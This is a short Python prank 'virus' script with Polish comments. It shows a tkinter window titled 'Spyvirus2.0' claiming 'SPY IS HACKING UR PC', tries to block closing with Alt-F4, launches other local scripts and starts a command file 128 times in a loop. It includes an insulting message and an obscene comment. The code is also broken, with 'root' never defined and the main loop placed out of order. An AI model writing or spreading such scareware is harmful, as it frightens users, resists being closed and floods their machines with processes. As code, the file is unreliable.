import os
from random import random
import time
import tkinter as tk
#importowanie
from threading import Thread

pressed_f4 = False  # Is Alt-F4 pressed?

def do_exit():
    global pressed_f4
    print('Trying to close application')
    if pressed_f4:  # Deny if Alt-F4 is pressed
        print('Denied!')
        pressed_f4 = False  # Reset variable
    else:
        close()     # Exit application

def alt_f4(event):  # Alt-F4 is pressed
    global pressed_f4
    print('Alt-F4 pressed')
    pressed_f4 = True

def close(*event):  # Exit application
    root.destroy()

root.bind('<Alt-F4>', alt_f4)
root.bind('<Escape>', close)
root.protocol("WM_DELETE_WINDOW",do_exit)

root.mainloop()
def func1():
    os.system("python C:/spei/window1.py")
#funkcja 1 pokazywanie okna    

def func2():
    os.system("python C:/spei/rtd.py")
    time.sleep(10)
#funkcja 2 ffplay
if __name__ == '__main__':
    Thread(target = func1).start()
    Thread(target = func2).start()
#zaczynaie i pierwszenstwo funkcji
window = tk.Tk() 
window.title( "Spyvirus2.0" ) #tytol okna
text = tk.StringVar()
label = tk.Label( window, textvariable = text, padx=100, pady=20)
label.pack()
text.set("SPY IS HACKING UR PC") #text w oknie
description = tk.Label(window, text="any last words?:").pack()
name = tk.Entry(window,width=40)
name.pack()
def Spyvirusmain(): #definiowanie
    text.set("{0}- I WILL NOT READ THIS, HERE GO FUCK YOURSELF ".format(name.get())) #przycisk ktory jest useless
ok = tk.Button(window, text="OK", width=20, command=Spyvirusmain)
ok.pack()
os.system("start C:\spei\image.py") #obrazek szpiega
#wszystko skradzione z jakiejs strony bo jestem script kidem
for i in range(128):
    os.system("start C:\spei\weird.cmd")
#downloading gay porn intensives
